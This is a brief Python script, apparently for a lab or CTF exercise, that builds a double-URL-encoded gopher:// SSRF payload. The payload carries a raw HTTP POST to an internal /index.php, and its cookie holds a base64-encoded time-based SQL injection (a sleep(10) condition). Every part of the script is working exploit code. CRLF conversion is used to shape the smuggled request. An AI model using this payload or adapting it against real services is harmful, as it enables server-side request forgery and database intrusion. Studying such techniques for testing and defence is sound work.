import urllib.parse

host = "127.0.0.1:80"
content = "uname=admin&passwd=admin"
cookie = "this_is_your_cookie=YWRtaW4nKSBhbmQgaWYoMSxzbGVlcCgxMCksMSkj"
content_length = len(content)

payload =\
"""POST /index.php HTTP/1.1
Host: {}
User-Agent: curl/7.43.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: {}
Cookie: {}

""".format(host,content_length,cookie)
# print(payload)

tmp = urllib.parse.quote(payload) #对payload中的特殊字符进行编码
new = tmp.replace('%0A','%0D%0A') #CRLF(换行)漏洞
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)# 对新增的部分继续编码
print(result)
